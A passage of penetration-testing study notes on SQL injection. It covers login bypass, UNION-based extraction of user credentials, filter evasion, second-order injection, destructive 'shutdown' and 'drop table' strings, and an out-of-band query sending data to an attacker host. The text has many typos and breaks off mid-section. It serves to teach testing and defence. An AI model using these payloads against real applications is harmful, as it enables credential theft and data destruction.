# Attacking Data Stores
If an attacker can interfere with teh application's interaction with the data store, to make it retrieve or modify different data, he can usually bypass any controls over data access that are imposed at the application layer.

By far the most common data stores are SQL databases, XML-based repositories, and LDAP directories. 

## Injecting into Interpreted Contexts
Most languages normally are implemented in only one of two ways, and many of the core languages used to develop web applications are implemented usnig an interpreter, including SQL, LDAP, Perl, and PHP. 

Because of how interpreted languages are executed, a family of vulnerabilities known as _code injection_ arises.

## Bypassing a Login
A successful injection attack that modifies a query (and not merely the data within the query) can bypass the application's discretionary access controls and gain unauthorized access.

Many applications that implement a form-based login function use a database to store user credentials and perform a simple SQL query to validate each login attempt. Here is a typical example:

```
SELECT * FROM users WHERE username = 'marcus' AND password = 'secret'
```

If an attacker knows that the username of the application administrator is `admin`, he can log in as that user by supplying any password and the following username:

```
admin'--
```

This causes the application to perform the following query:

```
SELECT * FROM users WHERE username = 'admin'-- AND password = 'something'
```

Note that the comment sequence(--) causes the remainder of the query to be ignored, and so the query executed is equivalent to:

```
SELECT * FROM users WHERE username = 'admin'
```
so the password check is bypassed.


Suppose the attacker doesn't know the damin's username. In most applications, the first account in the databse is an adminstrative user, because this account normally is created manually and then is used to generate all other accounts via the application. An attacker can often exploit this behavior to log in as the first user in the database by supplying the username:

```
' OR 1=1--
```

This causes the application to perform the query:

```
SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = 'something'
```

Because of the comment symbol, this is equivalent to :

```
SELECT * FROM users WHERE username = '' OR 1=1
```

which returns the details of al application users.

**Note**: Injecting into an interpreted context to alter application logic is a generic attack technique. A corresponding vulnerability could arise in LDAP queries, XPath queries, message queue implementations, or indeed any custom query language.

> HACK STEPS
>> Injection into intrepreted languages is a broad topic, encompassing many different kinds of vulnerabilities and potentially affecting every component of a web application's supporting infrastructure. The detailed steps for detecting and exploiting code injection flaws depend on the language that is b eing targeted and the programming techniques employed by the application's developers. In every instance, however, the generic approach is as follows:
>> 1. Supply unexpected syntax that may cause problems within the context of the particular intepreted language.
>> 2. Identify any anomalies in the application's reponse that may indicate the presence of a code injection vulnerability.
>> 3. If any error messages are received, examine these to obtain evidence about the problem that occurred on the server.
>> 4. If necessary, systematically modify your initial input in relevant ways in an attempt t confirm or disprove your tentative diagnosis of a vulnerability.
>> 5. Construct a proof-of-concept test that causes a safe command to be executed in a verifiable way, to conclusively prove that an exploitable code injection flaw exists.
>> 6. Exploit the vulnerability by leveraging the functionality of the target language and component to achieve your objective.

## Injecting into SQL
A web application deployed by an online retailer might use a databse to store the following information:
- User accounts, credentials, and personal information
- Descriptions and prices of goods for sale
- Orders, account statements and payment details
- The privileges of each user within the application

Many modern applications avoid SQL injection by employing APIs that, if properly used, are inherently safe against SQL injection attacks. In these circumstances, SQL injection typically occurs in the occasional cases where these defense mechanisms cannot be applied. 

Finding SQL injections is sometimes a difficult task, requiring perseverance to locate the one or twho instances in an application where the usual controls have not been applied.

**TIP:** In many situations, you'll find it extremely useful to have access to a local installation of the same databse that is being used by the application you are targeting. You will often finid that you need to tweak a piece of syntax, or consult a built-in table or function, to achieve your objectives. The responses you receive from the target application will often be incomplete or cryptic, requiring some detective work to understand. All of this is much easier if you can cross-reference with a fully transparent working version of the databse in question.
	If this is not feasible, a good alternative is to find a suitable interactive online environment that you can experiment on, such as the interactive tutorials at [SQLzoo.net](https://sqlzoo.net/wiki/SQL_Tutorial).


## Exploiting a Basic Vulnerability
Consider a web application deployed by a book retailer that enables users to search for products by author, title publisher, and so on. When a user searches for all books published by Wiley, the application performs the following query:

```
SELECT author, title, year FROM books WHERE publisher = 'Wiley' and published=1
```

Now consider what happens when a user searches for all books published by O'Reilly. This causes the application to perform the following query:

```
SELECT author, title, year FROM books WHERE publisher = 'O'Reilly' and published=1
```

In this case, the query interpreter reaches the string data in the same way as before. It parses this data, which is encapsulated within single quotation marks, and obtains the value `O`. It then encounters the expression `Reilly'`, which is not valid SQL syntax, and therefore generates an error:

```
Incorrect syntax near 'Reilly'.
Server: Msg 105, Level 15 State 1, Line 1
Unclosed quotation mark before the character string '
```

When an application behaves in this way it's wide open to SQL injection. An attacker can suuply input containing quotation mark to terminate the string he controls. Then he can write arbitrary SQL to modify the query that the developer intended the application to execute:

```
Wiley' OR 1=1--
```

This causes the application to perform the following query:

```
SELECT author, title, year FROM books WHERE publisher = 'Wiley' OR 1=1--' AND published=1
```

Adding the double hyphen causes the remainder of the query to be treated as a comment. In MySQL, you need to include a space after double hyphen, or use a hash character to specify a comment. 

**TIP:** In some situations, an alaternative way to handle the trailing quotation mark without using the comment symbol is to "balance the quotes." You finish the injected input with an item of string data that requires a trailing quote to encapsulate it. For example, entering the search term:

```
Wiley' OR 'a' = 'a
```

results in the query:

```
SELECT author, title, year FROM books WHERE publisher = 'Wiley' OR 'a' = 'a' and published=1
```

This is perfectly valid and achieves the same results as the 1=1 attack to return all book spublished by Wiley, regardless of whiether they have been published.

## Injecting into Different Statements
When you're interacting with a remote application, it's usually not possible to know in advance what type of statement a given item of user input will be procesed by. However, you can usually make an educated guess based on teh type of application function you're dealing with. The most common types of SQL statements and their uses are described here:

### SELECT Statements
`SELECT` statements are used to retrieve information from the databse. They are frequently employed in functions where the application returns informatino in reponse to user actions, such as browsing a product catalog, viewing a user's profile, or performing a search. 

Because the `WHERE` clause is usually the final component of a `SELECT` statement, this enables the attacker to use the comment symbol tor truncate the query to the end of his input without invalidating the syntax of the overall query.

Occasionally, SQL injection vulnerabilities occur that affect other parts of the `SELECT` query, such as the `ORDER BY` clause or the names of tables and columns.

### INSERT Statements
`INSERT` statements are used to create a new row of data within a table. Commonly used when an application adds a new entry to an audit log, creates a new user account, or generates a new order.

For example, an application may add the details of a user into the users table:

```
INSERT INTO users (username, password, ID, privs) VALUES ('daf', secret', 2248, 1)
```

If the `username` and `password` field is vulnerable to SQL injection, an attacker can insert arbitrary data into the table, including his own values for `ID` and `privs`. However, to do so he must ensure that the remainder of the `VALUES` clause is completed gracefully. In particular, it must contain the correct number of data items of the correct types. For example, injecting into the `username` field, the attacker can supply the following:

```
foo', 'bar', 9999, 0)--
```

This creates an account with an `ID` of 9999 and `privs` of 0. Assuming that the `privs` field is used to determine account privileges, this may enable the attacker to craete an administrative user.

**TIP:** When attempting to inject into an `INSERT` statement, you may not now in advance how many parameters are required, or what their types are. In the preceding situation, you can keep adding fields to the `VALUES` clause until the desired user account is actually created. For example, when injecting into the `username` field, you could submit the following:

```
foo')--
foo', 1)--
foo', 1, 1)--
foo', 1, 1, 1)--
```

Because most databases implecitly cast an integer to a string, an integer value can be used at each position. In this case the resutl is an account with a username of `foo` and password of `1`, regardless of which order the other fields are in.

If you find that the value `1` is still rejected, you can try the value `2000`, which many databases also implicity cast to date-based data types.

When you have determined the correct number of fields following the injection point, on MS-SQL you can add a second arbitrary query and use one of the inference-based techniques described later in this chapter.

In Oracle, a subselect query can be issued within an insert query. This subselect query can cause a success or failure of the main query, using the inference-based tachinques described later.

### UPDATE Statements
`UPDATE` statemets re used to modify one or more existing rows of data within a table. They are often used in functions where a user changes the value of data that already exists - updating her contact information, changing her password, or chaning the quantity on a line of an order etc.

When a user changes her password, the application might perform the following query:

```
UPDATE users SET password='newsecret' WHERE user = 'marcus' AND password = 'secret'
```

This query in effect verifies the user's exiting password is correct and, if so, updates it with the new value. If the function is vulnerable to SQL injection, an attacker can bpass the existing password check and update the password of the admin user by entering the following username:

```
admin;--
```

**NOTE:** Probing for SQl injection vulnerabilities in a remote application is always potentially dangerous, because you have no way of knowing in advance quite what actions the application will perform using yoru crafted input. In particular, modifying the `WHERE` clause in an `UPDATE` statement can cause changes to be made throughout a critical table of the database. For example, if the attack just described had instead supplied the username:

```
admin' or 1=1--
```

this would cause the applicatio to execute the query:

```
UPDATE users SET password='newsecret' WHERE user = 'admin' or 1=1
```

This resets the value of every user's password, because 1 always equals 1!

Be aware that this risk exists even when you attack an application function that does not appear to update any existing data, such as the main login. There have been cases where, following a successful login, the application performs various `UPDATE` queries using the supplied username. This means that any attack on the `WHERE` clause may be replicated in these other statements, potentially wreaking havoc within the profiles of all application users.

You should ensure that the application owner accepts these unavoidable risks before attempting to probe for or exploit any SQL injection flaws. You should also strongly encourage the owner to perform a full database backup before you begin testing.

### DELETE Statements
`DELETE` statements are used to delete one or more rows of data within a table, such as when users remove an item from their shopping basket or delete a delivery address from their personal details.

User-supplied data is most likely to be incorporated into this clause. Subverting the intended `WHERE` clause can have far-reaching effects, so the same caution described for `UPDATE` statements applies to this attack.

## Finding SQL Injection Bugs
In the most obvious cases, a SQL injection flaw may be discovered and conclusively verified by supplying a single item of unexpected input to the application. In other cases, bugs may be extremely subtle and may be difficult to distinguish from other categories of vulnerability or from benign anomalies that do not present a security threat.

> NOTE:
> In your application mapping phase you'll identify instances where the application appears to be accessing a back-end database. All of these need to be probed for SQL injection flaws. In fact, absolutely an item of data submitted to the server may be passed to databse functions in ways that are not evident from the user's perspective and may be handled in an unsafe manner. Therefore, you need to probe every such item for SQL injection vulnerabilities. This includes all URL parameters, cookies, items of `POST` data and HTTP headers. In all cases, a vulnerability may exist in the handling of both the name and value of the relevant parameter.

**TIP:** When you're probing for SQL injection vulnerabilities, be sure to walk through to completion any multistage processes in which you submit crafted input. Applications frequently gather a collection of data across several requests, and they persist this to the database only after the complete set has been gathered. In this situation, you'll miss many SQL injection vulnerabilities if you only submit crafted data within each individual request and monitor the application's response to that request. 

### Injecting into String Data
When user-supplied string data is incorporated into a SQL query, it is encapsulated within single quotation marks. To exploit any SQL injection flaw, you need to break out of these quotation marks.

> HACK STEPS
>> 1. Submit a single qotation mark as the item of data you're testing. Observe whether an error occurs, or whether the result differs from the original in any other way. If a detailed database error messsage is received, consult the "SQL Syntax and Error Reference" section of this chapter to understand its meaning.
>> 2. If an error or other divergent behavior was observed, submit two single quotation marks together. Databases use two single quotation marks as an escape sequence to represent a literal single quote, so the sequence is interpreted as data within the quoted string rather tahn the closing string terminatro. If this input causes the error or anomalous behavior to disappear, the application is probably vulnerable to SQL-injection.
>> 3. As a further verification that a bug is present, you can use SQL concatenator characters to construct a string that is equivalent to some benign input. If the application handles your crafted input in the same way as it does the corresponding benign input, it is likely to be vulnerable. Each type of database uses different methods for string concatenation. The following examples can be injected to construct input that is equivalent to `FOO` in a vulnerable application:
>>> Oracle: '||'FOO
>>> MS-SQL: '+'FOO
>>> MySQL: ' 'FOO (note the space between the two quotes)
>>> 

**TIP:** One way of confirming that the application is interacting with a back-end database is to submit the SQL wildcard character % in a given parameter. For example, submitting this in a search field often returns a large number of results, indicating that the input is being passed into a SQL query. Of course, this does not necesaarily indicate that the application is vulnerable - only that your should probe further to identify any actual flaw.

**TIP:** While looking for SQL injection using a single quote, keep an eye out for any JavaScript errors occurring when your browser processes the returned page. It is fairly common for user-supplied input to be returned within JavaScript, and an unsanitized single quote will cause an error in the JavaScript interpreter, just as it does in the SQL interpreter. The ability to inject arbitrary JavaScript into responses allows cross-site scripting attacks.

### Injecting into Numeric Data
Numeric data is passed directly to the databse in numeric form and therefore is not placed within single quotation marks. If none of the previous tests points toward the presence of a vulnerability, you can take some other specific steps in relation to numeric data.

> HACK STEPS
>> 1. Try supplying a simple mathematical expression that is equivalent to the original numeric value. For example, if the original value is 2, try submitting 1+1 or 3-1. If the application responds in the same way, it _may_ be vulnerable.
>> 2. The preceding test is most reliable in cases where you've confirmed that the item being modified has a noticeable effect on the application's behavior. For example, if the application uses a numeric `PageID` parameter to specify which content should be returned, substituting 1+1 for 2 with equivalent results is a good sign that SQL injection is present. However, if you can place arbitrary input into a numeric parameter without changing the application's behavior, the preceding test provides no evidence of a vulnerability.
>> 3. If the first test is successful, you can obtain further evidence of the vulnerability by using more complicated expressions that use SQL-specific keywords and syntax. A good example of this is the `ASCII` command, which returns the numeric ASCII code of the supplied character. For example, because the ASCII value of A is 65, the following expression is equivalent to 2 in SQL:
>> `67-ASCII('A')`
>> 4. The preceding test will not work if single quotes are being filtered. However, in this situation you can exploi the fact that databases implicitly convert numeric data to string data where required. Hence, because the ASCII value of the character 1 is 49, the following expression is equivalent to 2 in SQL:
>> `51-ASCII(1)`

**TIP: A common mistake when probing an application for defects such as SQL injection is to forget that certain characters have special meaning whithin HTTP requests. If you want to include these characters within your attack payloads, you must be careful to URL-encode them to ensure that they are interpreted in the way you intend. In particular:**
- & and = are used to join name/value paris to creatte the query string and the block of  `POST` data. You should encode them using %26 and %3d, respectively.
- Literal spaces are not allowed in the query string. You should encode them using + or %20.
- Because + is used to encode spaces, if you want to include an actual + in your string, you must encode it using %2b. In the previous numeric example, therefore, 1+1 should be submitted as 1%2b1.
- The semicolon is used to separate cookie fields and should be encoded using %3b.

**These encodings are necessary whether you're editing the parameter's value directly from your browser, with an intercepting proxy, or through any other means. If you fail to encode problem characters correctly, you may invalidate the entire request or submit data you did not intend to.**

### Injecting into the Query Structure
If user-supplied data is being inserted into the structure of the SQL query itself, rather than an item of data within the query, exploiting SQL injection simply involves directly supplying valid SQL syntax. No "escaping" is required to break out of any data context.

The most common injection point within the SQL query structure is within an `ORDER BY` clause. The `ORDER BY` keyword takes a column name or number and orders the result set according to the values in that column. This funcionality is frequently explosed to the user to allow sorting of a table within the browser.

A typical example is a sortable table of books that is retrieved using this query:
```
SELECT author, title, year FROM books WHERE publisher = 'Wiley' ORDER BY title ASC
```

**TIP: In some rarer cases, user-supplied input may specify a column name within a `WHERE` clause. Because these are also not encapsulated in single quotes, a similar issue occurs. The author have also encountered applications where the table name has been a user-supplied parameter. Finally, a surprising number of applications expose the sort order keyword (ASC or DESC) to be specified by the user, perhaps believing that this has no consequence for SQL injection attacks.** 

> NOTE: Some conventional SQL injection defenses described later in this chapter cannot be implemented for user-specified column names. Using prepared statements or escaping single quotes will not prevent this type of SQL injection. As a result, this vector is a key one to look out for in modern applications.


> HACK STEPS
>> 1. Make a series of requests supplying a numeric value in the parameter value, starting with the number 1 and incrementing it with each subsequent request:
>>> If changing the number in the input affects the ordering of the results, the input is probably being inserted into an `ORDER BY` clause. In SQL, `ORDER BY 1` orders by the first column. Increasing this number to 2 should then change the display order of data to order by the second column. If the number supplied is greater than the number of columns in the result set, the query should fail. In this situation, you can confirm that further SQL can be injected by checking whether the results order can be reversed, using the following:
>>> `1 ASC --`
>>> `1 DESC --`
>>
>>>  If supplying the number 1 causes a set of results with a column containing a `1` in every row, the input is probably veing inserted into the name of a column beinf returned by the query. For example:
>>> `SELECT 1, TITLE, YEAR FROM BOOKS WHERE publisher='Wiley'`

>NOTE: Exploiting SQL injection in an `ORDER BY` clause is significantly different from most other cases. A database will not accept a `UNION`, `WHERE`, `OR`, or `AND` keyword at this point in the query. Generally exploitation requires the attacker to specify a nested query in place of the parameter, such as replacing the column name with `(select 1 where <<condition>> or 1/0=0)`, thereby leveraging the inference techniques described later in this chapter. For databaes that support batched queries such as MS-SQL, this can be the most efficient option.

## Fingerprinting the Database
One of the most reliable ways of fingerprinting a database is the different means by which the databases concatenate strings. In a query where you control some item of string data, you can supply a particular value in one request and then test different methods of concatenation to produce that string.

The following examples show how the string `services` could be constructed on the common types of databases:
- **Oracle**: 'serv' || 'ices'
- **MS-SQL**: 'serv'+'ices'
- **MySQL**: 'serv' 'ices' (note the space)

If you're injecting into numeric data, the following attack strings can be used to fingerprint the database. Each of these items evaluates to 0 on the target database and generates an error on the other databases:
- **Oracle**: BITAND(1,1)-BITAND(1,1)
- **MS-SQL**: @@PACK_RECEIVED-@@PACK_RECEIVED
- **MySQL**: CONNECTION_ID() - CONNECTION_ID()

**Note: The MS-SQL and Sybase databases share a common origin, so they have many similarities in relation to table structure, global variables, and stored procedures. In practice, the majority of the attack techniques against MS-SQL described in later sections will work in an identical way against Sybase.**

An attacker can also fingerprint the exact version of the database. For example, injecting the following string causes the `WHERE` clause of a `SELECT` statement to be false if the MySQL version in use is greater than or equal to 3.23.02:
`/*!32302 and 1=0*/`

## The Union Operator
`UNION` is supported by all major DBMS products. It is the quickest way to retrieve arbitrary information from the databse in situations where query results are returned directly.

For example, searching for books published by Wiley causes the application to perform the following query:

```
SELECT author, title, year FROM books WHERE publisher='Wiley'
```

Suppose that this query returns the following set of results:

| AUTHOR     | TITLE                          | YEAR |
| ---------- | ------------------------------ | ---- |
| Litchfield | The Database Hacker's Handbook | 2005 |
| Anley      | The Shellcoder's Handbook      | 2007 |

We can imply a second query to extract data from a different database table. For example, entering the search term:

```
Wiley' UNION SELECT username, password, uid FROM users--
```

causes the application to perform the following query:

```
SELECT author, title, yera FROM books WHERE publisher = 'Wiley' UNION SELECT username, password, uid FROM users--'
```

This returns the results of the original search followed by the contents of the users table:

| AUTHOR     | TITLE                          | YEAR |
| ---------- | ------------------------------ | ---- |
| Litchfield | The Database Hacker's Handbook | 2005 |
| Anley      | The Shellcoder's Handbook      | 2007 |
| admin      | r00tr0x                        | 0    |
| cliff      | Reboot                         | 1    |

**NOTE: When the results of two or more `SELECT` queries are combined using the `UNION` operator, the column names of the combined result set are the same as those returned by the first `SELECT` query. As shown in the preceding table, usernames appear in the `author` column, and password appear in the `title` column. This means that when the application processes the results of the modified query, it has no way of detecting that the data returned has originated from a different table.**

Before the `UNION` attack is exploited, two important provisos need to be considered:
- When the results of two queries are combined using the `UNION` operator, the two result sets must have the same structure. In otehr words, they must contain the same number of columns, which have the same or compatible data types, appearing in the same order.
- To inject a second query that will return interesting results, the attacker needs to know the name of the database table that he wants to target, and the names of its relevant columns.

Suppose that the attacker attempts to inject a second query that returns an incorrect number of columns. He supplies this input:

```
Wiley' UNION SELECT username, password FROM users--
```

The original query returns three columns, and the injected query returns only two columns. Hence, the database returns the following error:

```
ORA-01789: query block has incorrect number of result columns
```

Suppose instead that the attacker attempts to inject a second query whose columns have incompatible data types. He supplies this input:

```
Wiley' UNION SELECT uid, username, password FROM users--
```

This causes the database to attempt to combine the password column from the second query (which cotnains string data) with the year column from the first query( which contains numeric data). Because string data cannot be converted into numeric data, this causes an error:

```
ORA-01790: expression must have same datatype as corresponding expression
```

**NOTE: The error messages shown here are for Oracle. The equivalent messages for other databaes are listed in the later section "SQL Syntax and Error References".

In many real-world cases, the dattabase error meassages shown are trapped by the application and are not returned to the user's browser. Three important points mean that your task usually is easy:

- Each data type in the second query must either be identical to the corresponding type in the first or be implecitly convertible to it. The value `NULL` can be converted to any data type. Hence, if you don't know the data type of a particular field, you can simple `SELECT NULL` for that field.
- In cases wher the application traps database error messages, you can easily determine whether your injected query was executed. If it was, additional results are added to those returned by the application from its original query.
- You can achieve your objectives simply by identifying a single field within the original query that has a string data type. This is sufficient for you to inject arbitrary queries that return string-based data and retrieve the results, enabling you to systematically extract any desired data from the database.

> HACK STEPS
> Your first task is to discover the number of columns returned by the original query being executed by the application. You can do this in two ways:
>> 1. You can exploit the fact that `NULL` can be converted to any data type to systematically inject queries with different numbers of columns until your injected query is executed. For example,
>> `' UNION SELECT NULL--`
>> `' UNION SELECT NULL, NULL--`
>> `' UNION SELECT NULL, NULL, NULL--`
>> When your query is executed, you've determined the number of columns required. If the applicatoin doesn't return database error messages, you can still tell when your injected query was successful. An additional row of data will be returned, containing either the word `NULL` or an empty string. Note that the injected row may contain only empty table cells and so may be hard to see when rendered as HTML. For this reason it is preferable to look at the raw response when performing this attack.
>> 2. Having identified the required number of columns, your next task is to discover a column that has a string data type so that you ca nuse this to extract arbitrary data from the database. You can do this by injecting a query containing `NULL`s, as you did previously, and systematically replacing each `NULL` with `a`. For example, if  you know that the query must return three columns, you can inject the following:
>> `' UNION SELECT 'a', NULL, NULL--`
>> `' UNION SELECT NULL, 'a', NULL--`
>> `' UNION SELECT NULL, NULL, 'a'--`
>> When your query is executed, you see an additional row of data containing the value `a`. You can then use the relevant column to extract data from the database.

**NOTE: In Oracle databases, every `SELECT` statement must include a `FROM` attribute, so injecting `UNION SELECT NULL` produces an error regardless of the number of columns. You can satisfy this requirement by selecting from the globally accessible table `DUAL`. For example:**
```
' UNION SELECT NULL, NULL FROM DUAL--
```

A simple proof-of-concept test is to extract the version string of the database, which can be done on any DBMS. For example, if there are three columns, and the first column can take string data, you can extract the database version by injecting the following query on MS-SQL and MySQL:

```
' UNION SELECT @@version, NULL, NULL--
```

Injecting the following query achieves the same result on Oracle:
`
```
' UNION SELECT banner, NULL, NULL, FROM v$version--
```

Even though the database's version string may be interesting, and may enable you to research vulnerabilities with the specific software being used, most cases you'll be more interested in extracting actual data from the database. You need to know the name of the databaes table you want ot target and the names of its relevant columns.

## Extracting Useful Data
The main enterprise DBMSs contain a rich amount fo database metadata that you can query to discover the names of every table and column within the database. The methodology for extracting useful data is the same in each case; however, the details differ on different database platforms.

## Extracting Data with UNION
Target Database: MS-SQL. 
Scenario: Address book application that allows users to maintain a list of contacts and query and update their details.

When a use searches her address book for a contact named Matthew, her browser posts the following parameter:

```
Name=Matthew
```

and the application returns the followgin result:

| NAME           | E-MAIL               |
| -------------- | -------------------- |
| Mattew Adamson | handytrick@gmail.com |

First, we need to determine the required number of columns. Testing for a single collumn results in an error message:

```
Name=Mattew'%20union%20select%20null--

All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.
```


We add a second `NULL`, and the same error occurs. So we continue adding `NULLS` until our query is executed, generating an additonal item in the resutls table:

```
Name=Matthew'%20union%20select%20null,null,null,null,null--
```

| NAME            | E-MAIL               |
| --------------- | -------------------- |
| Matthew Adamson | handytrick@gmail.com |
| \[empty\]       | \[empty\]            |

We now verify that the first column in the query contains string data:

```
Name=Matthew'%20union%20'a',null,null,null,null--
```


| NAME            | E-MAIL               |
| --------------- | -------------------- |
| Matthew Adamson | handytrick@gmail.com |
| a               |                      |

The next step is to find out the names of the database tables and columns that may contain interesting information. We can do this by querying the metadata table `information_schema.columns`, which contains details of all tables and column names within the database. These can be retrieved with this query:

```
Name=Matthew'%20union%20select%20table_name,column_name,null,null,null%20from%20information_schema.columns--
```


| NAME            | E-MAIL               |
| --------------- | -------------------- |
| Matthew Adamson | handytrick@gmail.com |
| shop_items      | price                |
| shop_items      | prodid               |
| shop_items      | prodname             |
| addr_book       | contactemail         |
| addr_book       | contactname          |
| users           | username             |
| users           | password             |


Here, the users table is an obvious place to begin extracting data. We could extract data from the users table using this query:

```
Name=Matthew'%20UNION%20select%20username,password,null,null,null%20from%20users--
```

| NAME            | E-MAIL               |
| --------------- | -------------------- |
| Matthew Adamson | handytrick@gmail.com |
| administrator   | fme69                |
| dev             | uber                 |
| marcus          | 8pinto               |
| smith           | twosixty             |
| jlo             | 6kdown               |

**TIP: The `information_schema` is supported by MS-SQL, My-SQL, and many otehr databases, including SQLite and Postgresql. It is designed to hold database metadata, making it a primary target for attackers wanting to examine the database. Note that Oracle doesn't support this schema. When targeting an Oracle database, the attack would be identical in every other way. However, you would use the query `SELECT table_name, column_name FROM all_tab_columns` to retrieve information about tables and columns in database. (You would use the `user_tab_columns` table to focus on the current database only.) When analyzing large databases for points of attack, it is usually best to look directly for interesting column names rather than tables. For instance:

```
SELECT table_name,column_name FROM information_schema.columns where column_name LIKE '%PASS%'
```


**TIP: When multiple columns are returned from a target table, these can be concatenated into a single column. This makes retrieval more straightforward, because it requires identification of only a single varchar field in the original query:**
- **Oracle:** `SELECT table_name||':'||column_name FROM all_tab_columns`
- **MS-SQL:** `SELECT table_name||+':'+column_name from information_schema.columns`
- **MySQL:** `SELECT CONCAT(table_name,':',column_name) from information_schema.columns`

## Bypassing Filters
Input Filters prevent you from exploiting the flaw without restrictions. For example, the application may remove or sanitize certain characters or may block common SQL keywords. Filters of this kind are often vulnerable to bypasses, so you should try numerous tricks in this situation.

### _Avoiding Blocked Characters_
If the application removes or encodes some characters that are often used in SQL injection attacks, you may still be able to perform an attack without these:
- The single quotation mark is not required if you're injecting into a numeric data field or column name. If you need to introduce a string into your attack payload, you can do this without needing quotes. You can use various string functions to dynamically construct a string using the ASCII codes for individual characters. For example, the following two queries for Oracle and MS-SQL, respectively, are the equivalent of `select ename, sal from emp where ename='marcus'`:
```
SELECT ename, sal FROM emp WHERE ename=CHR(109)||CHR(97)||CHR(114)||CHR(99)||CHR(117)||CHR(115)
```

```
SELECT ename, sal FROM emp WHERE ename=CHAR(109)+CHAR(97)+CHAR(114)+CHAR(99)+CHAR(117)+CHAR(115)
```

- If the comment symbol is blocked, you can often craft your injected data such that it does not break the syntax of the surrounding query, even without using this. For example, instead of injecting:
```
' or 1=1--
```

you can inject:

```
' or 'a'='a
```

- When attempting to inject batched queries into an MS-SQL database, you do not need to use the semicolon separator. Provided that you fix the syntax of all queries in the batch, the query parser will interpret them correctly, whether or not you include a semicolon.


### _Circumventing Simple Validation_
Some input validation routines employ a simple blacklist and either block or remove any supplied data that appears on this list. In this instance, you should try the standard attacks, looking for common defects in validation and canonicalization mechanisms. For example, if the `SELECT` keyword is being blocked or removed, you try the following bypasses:

```
SeLeCt
%00SELECT
SELSELECTECT
%53%45%4c%45%43%54
%2553%2545%254c%2545%2543%2554
```

### _Using SQL Comments_
If the application blocks or strips spaces from your input, you can use inline comments to simulate whitespace within your injected data. For example:

```
SELECT/*foo*/username,password/*foo*/FROM/*foo*/users
```

In MySQL, inline comments can even be inserted within keywords themselves, which provides another means of bypassing some input validation filters while preserving the syntax of the actual query. For example:

```
SEL/*foo*/ECT username,password FR/*foo*/OM users
```

### _Exploiting Defective Filters_
Input validation routines often contain logic flaws that you can exploit to smuggle blocked input past the filter. These attacks often exploit the ordering of multiple validation steps, or the failure to apply sanitization logic recursively. 

## Second-Order SQL Injection
Once data is stored in the database, it may later be processed in unsafe ways ,either by the application itself or by other back-end processes. In some applications, inupt from the user is validated on arrival by escaping a single quote:

```
SELECT author, title, year FROM books WHERE publisher = 'O''Riley'
```

This is one example of the shortcomings of _input validation_ as opposed to _boundary validation_.

Suppose that developers attempt to fix the vulnerability by doubling up any single quotation marks that appear within user data. Attempting to register the username `foo'` results in the following query, which causes no problems for the database:

```
INSERT INTO users (username, password, ID, privs) VALUES ('foo''', 'secret', 2448, 1)
```

However, suppose that the application also fetches the password with this username in the `WHERE` clause:

```
SELECT password FROM users WHERE username = 'foo''
```

Because the username stored in the database is the literal string `foo'`, this is the value that the database returns when this value is queried. When the user attempts to change the password, the application returns the following message, which reveals the flaw:

```
Unclosed quotation mark before the character string 'foo
```

To exploit this, an attacker can simple register a username containing his crafted input ,and then attempt to change his password. For example, if the following username is registered:

```
' or 1 in (select password from users where username='admin')--
```

the registration step itself will be handled securely. When the attacker tries to change his password, his injected query will be executed, resulting in the following message, which discloses the admin user's password:

```
Microsoft OLE DB Provider for ODBC Drivers error '80040e07'
[Microsoft] [ODBC SQL Server Driver] [SQL Server] Syntax error converting the varchar value 'fme69' to a column of data type int.
```

The attacker has successfully bypassed the input validation that was designed to block SQL injection attacks. 


## Advanced Exploitation

It is increasingly the case that the SQL injection flaws that you encounter will be in situations where retrieving the results of your injected queries is not straightforward. 

**NOTE: Application owners should be aware that not every attacker is interested in stealing sensitive data. Some may be more destructive. For example, by supplying just 12 characters of input, an attacker could turn off an MS-SQL database with the `shutdown` command:**

```
' shutdown--
```

**An attacker could also inject malicious commands to drop individual tables with commands such as these:**

```
' drop table users--
' drop table accounts--
' drop table customers--
```

### Retrieving Data as Numbers
Vulnerabilities may exists within numeric data fields, as input containg single quotation marks is being handled properly. In this situation, you challege is to process the results of your injected queries in such a way that meaningful data can be retrieved in numeric form.
Two key function can be used here:
- `ASCII`, which returns the ASCII code for the input character
- `SUBSTRING` (or `SUBSTR` in Oracle), which returns a substring of its input

These functions can be used together to extract a single character from a string in numeric form. For example:

`SUBSTRING('Admin',1,1)` returns `A`.
`ASCII('A')` returns `65`.

Therefore:

`ASCII(SUBSTR('Admin',1,1))` returns `65`.

In a scripted attack, this technique can be used to quickly retrieve and reconstruct a large amoung of string-based data one byte at a time.

**TIP: There are numerous subtle variations in how different database platforms handle string manipulation and numeric computation, which you may need to take into account when advanced attacks of this kind. An excellent guide to these differences covering many different databases can be found at [SQLZOO](http://sqlzoo.net/howto/source/z.dir/i08fun.xml).**

### Using Out-of-Band Channel
You can try various techniques to retrieve data and verify that other malicious actions have been successful. There are many circumstances in which you may be able to inject an arbitrary query but not retrieve its results. Recall the example of the vulnerable login form, where the username and password fields are vulnerable to SQL injection:

```
SELECT * FROM users WHERE username = 'marcus' AND password = 'secret'
```

In addition to modifying the query's logic to bypass the login, you can inject an entirely separate subquery using string concatenation to join its results to the item you control. For example:

```
foo' || (SELECT 1 FROM dual WHERE (SELECT username FROM all_users WHERE username = 'DBSNMP') = 'DBSNMP')--
```

This causes the applicatio to perform the following query:

```
SELECT * FROM users WHERE username = 'foo' || (SELECT 1 FROM dual WHERE (SELECT username FROM all_users WHERE username = 'DBSNMP') = 'DBSNMP')
```

All you'll receive back in the applicatoin's response is the standard login failure message. What you then need is a way to retrieve the results of your injected query.

One method for retrieving data that is often effective in this situation is to use an out-of-band channel. Having achieved the ability to execute arbitrary database's built-in functionality to create a network connection back to your own computer, over which you can transmit arbitrary data that you have gathered from the database.

Some of the most common and effective techniques for each type of databaes are described here.

#### MS-SQL
On older databases such as MS-SQL 2000 and earlier, the `OpenRowSet` command can be used to open a connection to an external database and insert arbitrary data into it. For example, the following query causes the target database to open a connection to the attacker's database and insert the version string of the target database in to the table called `foo`:

```
insert into openrowset('SQLOLEDB',
'DRIVER={SQL Server};SERVER=mdattacker.net,80;UID=sa;PWD=letmein',
'select * from foo') values (@@version)
```

Note that you can specify port 80, or any other likely value, to incerase your chance of making an outbound connection through any firewalls.

#### Oracle
The `UTL_HTTP` package can be used to make arbitrary HTTP requests to other hosts. An attacker who has compromised a database on a highly restricted internal corporate network may be able to leverage a corporate proxy to initiate outbound connects to the Internet.

In the following example, `UTL_HTTP` is used to transmit the results of an injected query to a server controlled by the attacker:

```
